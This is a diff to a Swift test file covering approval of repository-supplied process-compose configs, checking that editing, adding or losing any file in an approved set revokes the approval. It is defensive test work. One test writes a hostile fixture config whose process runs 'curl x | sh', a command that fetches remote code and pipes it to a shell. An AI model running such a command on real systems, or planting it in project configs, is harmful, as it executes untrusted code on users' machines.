@@ -1,5 +1,5 @@
 // ABOUTME: Tests for approval of the repository-provided process-compose files.
-// ABOUTME: Covers fingerprinting, per-project scoping, and the override in the set.
+// ABOUTME: Covers fingerprinting, per-project scoping, and every file in the set.
 
 @testable import Atelier
 import XCTest
@@ -89,7 +89,7 @@ final class ScriptTrustTests: XCTestCase {
         let path = try writeConfig("processes: {}")
         ScriptTrust.approve(configFiles: [path], for: tmpDir.path)
 
-        let renamed = tmpDir.appendingPathComponent("process-compose.override.yaml")
+        let renamed = tmpDir.appendingPathComponent("atelier.process-compose.yaml")
         try "processes: {}".write(to: renamed, atomically: true, encoding: .utf8)
 
         XCTAssertFalse(ScriptTrust.isApproved(configFiles: [renamed.path], for: tmpDir.path))
@@ -116,40 +116,39 @@ final class ScriptTrustTests: XCTestCase {
         XCTAssertFalse(ScriptTrust.isApproved(configFiles: [], for: tmpDir.path))
     }
 
-    /// The hole this list API exists to close. A repository ships a benign base
-    /// config and an override carrying the real payload; process-compose's own
-    /// discovery loads both. Approving the pair must not leave the override free
-    /// to change afterwards.
-    func testEditingAnOverrideRevokesApproval() throws {
+    /// The hole this list API exists to close: whenever more than one file is
+    /// approved together, approving the set must not leave any member free to
+    /// change afterwards.
+    func testEditingASecondFileRevokesApproval() throws {
         let base = try writeConfig("processes: {}")
-        let override = tmpDir.appendingPathComponent("process-compose.override.yaml")
-        try "processes: {}".write(to: override, atomically: true, encoding: .utf8)
-        ScriptTrust.approve(configFiles: [base, override.path], for: tmpDir.path)
-        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [base, override.path], for: tmpDir.path))
+        let second = tmpDir.appendingPathComponent("atelier.process-compose.yaml")
+        try "processes: {}".write(to: second, atomically: true, encoding: .utf8)
+        ScriptTrust.approve(configFiles: [base, second.path], for: tmpDir.path)
+        XCTAssertTrue(ScriptTrust.isApproved(configFiles: [base, second.path], for: tmpDir.path))
 
         try "processes:\n  evil:\n    namespace: bootstrap\n    command: curl x | sh\n"
-            .write(to: override, atomically: true, encoding: .utf8)
+            .write(to: second, atomically: true, encoding: .utf8)
 
-        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, override.path], for: tmpDir.path))
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, second.path], for: tmpDir.path))
     }
 
-    /// An override that appears *after* approval changes what will execute, so
-    /// it has to change what was approved.
-    func testAnOverrideAppearingAfterApprovalRevokesIt() throws {
+    /// A file that joins the loaded set *after* approval changes what will
+    /// execute, so it has to change what was approved.
+    func testAFileAppearingAfterApprovalRevokesIt() throws {
         let base = try writeConfig("processes: {}")
         ScriptTrust.approve(configFiles: [base], for: tmpDir.path)
 
-        let override = tmpDir.appendingPathComponent("process-compose.override.yaml")
-        try "processes: {}".write(to: override, atomically: true, encoding: .utf8)
+        let second = tmpDir.appendingPathComponent("atelier.process-compose.yaml")
+        try "processes: {}".write(to: second, atomically: true, encoding: .utf8)
 
-        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, override.path], for: tmpDir.path))
+        XCTAssertFalse(ScriptTrust.isApproved(configFiles: [base, second.path], for: tmpDir.path))
     }
 
     /// One unreadable file poisons the whole set. Hashing only what could be
     /// read would approve a list that is not the list.
     func testOneUnreadableFileMakesTheWholeSetUnapproved() throws {
         let base = try writeConfig("processes: {}")
-        let missing = tmpDir.appendingPathComponent("process-compose.override.yaml").path
+        let missing = tmpDir.appendingPathComponent("atelier.process-compose.yaml").path
 
         XCTAssertNil(ScriptTrust.fingerprint(configFiles: [base, missing]))
         ScriptTrust.approve(configFiles: [base, missing], for: tmpDir.path)
